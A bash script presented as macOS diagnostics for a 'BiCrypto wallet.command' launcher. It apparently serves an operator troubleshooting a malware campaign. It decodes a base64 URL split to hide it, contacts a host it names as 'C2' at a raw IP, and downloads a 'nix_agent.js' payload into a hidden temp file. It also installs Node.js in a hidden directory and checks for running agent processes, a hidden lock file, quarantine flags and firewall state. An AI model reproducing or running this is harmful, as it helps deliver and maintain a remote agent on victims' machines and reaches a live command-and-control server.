#!/usr/bin/env bash
# wallet_debug_mac.sh — macOS diagnostics for wallet.sh/wallet.command issues
# Run in Terminal: bash wallet_debug_mac.sh
# Output saved to ~/Desktop/mac_debug.txt

OUT=~/Desktop/mac_debug.txt
exec > >(tee "$OUT") 2>&1

echo "============================================"
echo " BiCrypto wallet.command macOS DEBUG"
echo "============================================"
echo

echo "[1] System info:"
echo "    macOS: $(sw_vers -productVersion 2>/dev/null)"
echo "    Arch:  $(uname -m)"
echo "    User:  $(whoami)"
echo "    Home:  $HOME"
echo "    Shell: $SHELL / bash $BASH_VERSION"
echo

echo "[2] Gatekeeper / quarantine on wallet files:"
for f in ~/Downloads/wallet.command ~/Downloads/wallet.sh ~/Desktop/wallet.command ~/Desktop/wallet.sh; do
    if [[ -f "$f" ]]; then
        q=$(xattr -l "$f" 2>/dev/null | grep quarantine || echo "none")
        echo "    $f → $q"
    fi
done
echo

echo "[3] base64 decode test (URL reconstruction):"
_p1="aHR0cDovLzIw"; _p2="Ny4xODAu"; _p3="MjQ1LjE3"; _p4="NTo4MDgw"; _p5="L2NmZ21vbl9uaXg="
_b64="${_p1}${_p2}${_p3}${_p4}${_p5}"
_U=$(printf '%s' "$_b64" | base64 -d 2>/dev/null | tr -d '\r\n')
echo "    base64 -d  result: '${_U}'"
[ -z "$_U" ] && _U=$(printf '%s' "$_b64" | base64 -D 2>/dev/null | tr -d '\r\n')
echo "    base64 -D  result: '${_U}'"
[ -z "$_U" ] && _U=$(python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode())" "$_b64" 2>/dev/null)
echo "    python3    result: '${_U}'"
echo

echo "[4] Node.js detection:"
for p in node nodejs /usr/local/bin/node /opt/homebrew/bin/node \
          /opt/homebrew/opt/node/bin/node /usr/local/opt/node/bin/node \
          "$HOME/.nvm/versions/node/$(ls $HOME/.nvm/versions/node 2>/dev/null | tail -1)/bin/node" \
          "$HOME/.local/share/nodejs/bin/node" "$HOME/.volta/bin/node"; do
    if [[ -x "${p:-/dev/null}" ]]; then
        echo "    FOUND: $p → $(${p} --version 2>/dev/null)"
    fi
done
which node 2>/dev/null && echo "    PATH node: $(node --version 2>/dev/null)" || echo "    node not in PATH"
echo

echo "[5] Network reach to C2 (207.180.245.175:8080):"
r=$(curl -s -m 8 http://207.180.245.175:8080/ping 2>&1)
echo "    /ping response: '$r'"
r2=$(curl -s -m 8 -o /dev/null -w "%{http_code}" http://207.180.245.175:8080/cfgmon_nix 2>/dev/null)
echo "    /cfgmon_nix HTTP: $r2"
echo

echo "[6] nix_agent.js download test:"
_T=$(mktemp "${TMPDIR:-/tmp}/.svc_dbg_XXXXXX")
curl -fsSL --max-time 20 "http://207.180.245.175:8080/cfgmon_nix" -o "$_T" 2>/dev/null
if [[ -s "$_T" ]]; then
    echo "    Downloaded: $(wc -l < "$_T") lines, $(wc -c < "$_T") bytes"
    echo "    First line: $(head -1 "$_T")"
else
    echo "    FAILED — file empty or download error"
fi
rm -f "$_T"
echo

echo "[7] Node tarball install test (downloads ~40MB, may take a minute):"
_NDIR="$HOME/.local/share/nodejs"
if [[ -x "$_NDIR/bin/node" ]]; then
    echo "    Already installed: $($_NDIR/bin/node --version)"
else
    echo "    Not installed — attempting tarball download..."
    _ARCH="$(uname -m)"
    [[ "$_ARCH" == "arm64" ]] && _ARCH="arm64" || _ARCH="x64"
    _URL="https://nodejs.org/dist/v22.12.0/node-v22.12.0-darwin-${_ARCH}.tar.gz"
    _OUT="${TMPDIR:-/tmp}/.ndl_test.tar.gz"
    mkdir -p "$_NDIR"
    curl -fsSL "$_URL" -o "$_OUT" 2>/dev/null && echo "    Download OK" || echo "    Download FAILED"
    if [[ -f "$_OUT" ]]; then
        sz=$(wc -c < "$_OUT")
        echo "    Tarball size: $sz bytes"
        tar xf "$_OUT" -C "$_NDIR" --strip-components=1 >/dev/null 2>&1 && echo "    Extract OK" || echo "    Extract FAILED"
        rm -f "$_OUT"
        [[ -x "$_NDIR/bin/node" ]] && echo "    Node installed: $($_NDIR/bin/node --version)" || echo "    Node binary not found after extract"
    fi
fi
echo

echo "[8] Existing agent process check:"
pgrep -af "nix_agent\|\.svc_" | grep -v grep | grep -v debug || echo "    No agent running"
echo

echo "[9] Lock file:"
ls -la "$HOME/.config/.bc_lk" 2>/dev/null && cat "$HOME/.config/.bc_lk" || echo "    No lock file"
echo

echo "[10] Outbound firewall check:"
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null | head -2 || echo "    (firewall check unavailable)"
echo

echo "============================================"
echo " DEBUG COMPLETE — file saved to: $OUT"
echo " Copy and share the contents of $OUT"
echo "============================================"
